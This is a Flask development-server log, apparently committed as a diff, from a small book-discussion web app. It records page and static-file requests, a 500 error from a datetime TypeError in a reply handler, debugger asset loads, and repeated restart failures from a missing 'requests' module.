+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:19] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:58:20] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+211.36.145.121 - - [21/Oct/2020 06:58:21] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:47] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:48] "[37mGET /detail?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:48] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:49] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:49] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:49] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:49] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:49] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:49] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:49] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:49] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:58] "[35m[1mPOST /write_reply?id=5f8fd97aed2f576a5da29a8c HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 65, in write_reply
+    reply_time = datetime.now() + timedelta
+TypeError: unsupported operand type(s) for +: 'datetime.datetime' and 'type'
+124.49.105.89 - - [21/Oct/2020 06:58:58] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:58] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:58] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:58] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:59] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 06:58:59] "[37mGET /write_reply?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:31] "[32mPOST /write_question HTTP/1.1[0m" 302 -
+211.36.145.121 - - [21/Oct/2020 06:59:31] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:50] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 06:59:51] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+211.36.145.121 - - [21/Oct/2020 07:00:06] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+211.36.145.121 - - [21/Oct/2020 07:00:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+211.36.145.121 - - [21/Oct/2020 07:00:08] "[37mGET /detail?id=5f8fdc53ed2f576a5da29a8d HTTP/1.1[0m" 200 -
+ * Detected change in '/home/ubuntu/booksalon_flask/app.py', reloading
+ * Restarting with stat
+Traceback (most recent call last):
+  File "/home/ubuntu/booksalon_flask/app.py", line 10, in <module>
+    from book_api import getbook
+  File "/home/ubuntu/booksalon_flask/book_api.py", line 3, in <module>
+    import requests
+ModuleNotFoundError: No module named 'requests'
+Traceback (most recent call last):
+  File "app.py", line 10, in <module>
+    from book_api import getbook
+  File "/home/ubuntu/booksalon_flask/book_api.py", line 3, in <module>
+    import requests
+ModuleNotFoundError: No module named 'requests'
+Traceback (most recent call last):
+  File "app.py", line 10, in <module>
+    from book_api import getbook
+  File "/home/ubuntu/booksalon_flask/book_api.py", line 3, in <module>
+    import requests
+ModuleNotFoundError: No module named 'requests'
+[401 Error] Unauthorized
